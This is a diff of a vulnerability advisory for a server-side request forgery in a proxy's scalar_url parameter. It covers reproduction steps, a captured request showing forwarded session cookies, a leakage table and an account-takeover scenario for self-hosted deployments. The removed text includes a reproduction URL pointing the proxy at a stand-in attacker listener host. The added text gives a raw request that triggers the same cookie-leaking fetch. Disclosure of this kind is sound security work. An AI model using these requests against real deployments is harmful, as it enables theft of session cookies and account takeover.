@@ -1,44 +1,60 @@
-1. Vulnerability: Server-Side Request Forgery (SSRF) → 0-Click Account Takeover (ATO)
+## Vulnerability: Server-Side Request Forgery (SSRF)
 
-Parameter: scalar_url
-Severity: Critical
+**CVE:** CVE-2026-30118
+**Parameter:** `scalar_url`
+**Severity:** Critical (self-hosted deployments) / Medium (hosted instance)
 
-Description:
+> For the full vulnerability writeup, deployment scenarios, and ATO chain explanation
+> see [README.md](./README.md).
 
-The scalar_url parameter allows the server to fetch arbitrary attacker-controlled URLs. The
-internal fetcher forwards cookies and other sensitive headers when requesting the attacker
-URL. An attacker-controlled listener captured active session cookies from the internal server,
-enabling a zero-click account takeover if those cookies represent valid sessions.
-Steps to Reproduce (high-level, authorised test only):
+---
 
-● Host a listener URL that logs incoming requests, e.g. http://attacker-
-listener.example.com/.
+### Steps to Reproduce (authorised testing only)
 
-Trigger the proxy to fetch your listener by visiting or issuing a request to:
+1. Set up an OOB listener (e.g. Burp Collaborator, interactsh).
 
-# https://proxy.scalar.com/?&scalar_url=http://attacker-listener.example.com/
+2. Trigger the proxy to perform a server-side fetch to your listener:
 
-● Observe the request arriving at your listener. Example of an observed request:
+```
+GET /?scalar_url=http://YOUR-LISTENER/ HTTP/2
+Host: proxy.scalar.com
+Cookie: [victim cookies if testing self-hosted ATO scenario]
+```
 
+3. Observe the request at your listener. Confirmed captured interaction:
+
+```
 GET / HTTP/1.1
-Host: attacker-listener.example.com
-...
-Cookie: _li_dcdm_c=[REDACTED];
-        _lc2_fpi=[REDACTED];
-        _lc2_fpi_js=[REDACTED];
-        _li_ss=[REDACTED];
-        scalar-team-uid=[REDACTED];
-        vector_visitor_id=[REDACTED]
-X-Forwarded-For: [CLIENT-IP], [INTERNAL-IP]
-Forwarded: for="[CLIENT-IP]";proto=https
+Host: [YOUR-LISTENER]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Cookie: _li_dcdm_c=[REDACTED]; scalar-team-uid=[REDACTED]; _lc2_fpi=[REDACTED]; _lc2_fpi_js=[REDACTED]; ph_phc_..._posthog=[REDACTED]
+Forwarded: for="[VICTIM-IP]";proto=https
+X-Forwarded-For: [VICTIM-IP],[PROXY-IP]
+X-Forwarded-Proto: https
+Via: 1.1 google
+X-Cloud-Trace-Context: [TRACE-ID]
+```
 
+The outbound fetch originates from GCP infrastructure (`34.34.244.142`), confirming
+the request is server-side. The full inbound `Cookie` header is forwarded verbatim.
 
-● Confirm whether captured cookies/tokens are active (ONLY in an authorised test
-environment). If active, attempt to use them in a safe, approved test account to validate
-attacker access (do not test against production or without permission).
+---
 
-Proof / Evidence
+### What is leaked on proxy.scalar.com (hosted)
 
-Internal server [INTERNAL-IP] contacted the attacker listener and forwarded session cookies
-(for example scalar-team-uid), proving the proxy includes sensitive headers/cookies in
-server-side fetches.
+| Header / Value | Impact |
+|---|---|
+| `Cookie: scalar-team-uid=[VALUE]` | Team/workspace identifier disclosed |
+| `Cookie: _lc2_fpi`, `_li_dcdm_c` | Analytics fingerprint disclosed |
+| `Cookie: ph_phc_..._posthog` | PostHog user identity (`distinct_id`) disclosed |
+| `X-Forwarded-For: [VICTIM-IP]` | Victim source IP disclosed |
+
+---
+
+### ATO on self-hosted deployments
+
+When `scalar/astro` is deployed on a shared domain (e.g. `proxy.company.com`) alongside
+an application that sets `Domain=.company.com` auth cookies, the SSRF forwards the
+victim's JWT/session token to the attacker. See [README.md](./README.md) for the full
+attack chain and zero-click variant.
